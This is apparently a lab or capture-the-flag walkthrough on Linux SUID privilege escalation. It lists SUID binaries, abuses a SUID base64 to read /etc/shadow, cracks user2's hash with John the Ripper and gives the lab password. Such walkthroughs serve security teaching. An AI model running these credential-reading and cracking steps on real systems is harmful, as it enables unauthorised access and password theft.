# SUID :

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.

      find / -type f -perm -04000 -ls 2>/dev/null 
will list files that have SUID or SGID bits set.


![15](https://user-images.githubusercontent.com/94765997/162626966-ebd9a3cb-82cf-43ef-9f73-b071536ac49c.png)


A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set


# Exemple : 

The /etc/shadow file is used to increase the level of password security. The file contains a hashed version of the passwords and only very privileged users can access it.

![14](https://user-images.githubusercontent.com/94765997/162627534-d7bee33d-d976-4792-af16-0aa1db62efae.png)


# The command :
      
      base64 --decode 
                     
 # We see that the base64  has the SUID bit set by running the 
 
      find / -type f -perm -04000 -ls 2>/dev/null
  
  
 
![suid64](https://user-images.githubusercontent.com/94765997/162627310-93ebe67e-ed44-4fd4-be47-d5ea78c01ff8.png)

# and use it to decode /etc/shadow file and show all user hashes :

      LFILE=/etc/shadow
      /usr/bin/base64 "$LFILE" | base64 --decode



![16](https://user-images.githubusercontent.com/94765997/162627753-632f0f73-9a49-4911-8cbe-0fed1a906cb1.png)


# What is the password of user2? :


![user2](https://user-images.githubusercontent.com/94765997/162627918-081da508-e03c-450c-8d71-e39b2b6ec539.png)


      1- create file user2 containt user2 hash 
      2- use john the ripper to get user 2password 
      

![17](https://user-images.githubusercontent.com/94765997/162628019-8cc380ee-136d-4057-b6d5-54cfe144fdbb.png)


      Password = Password1
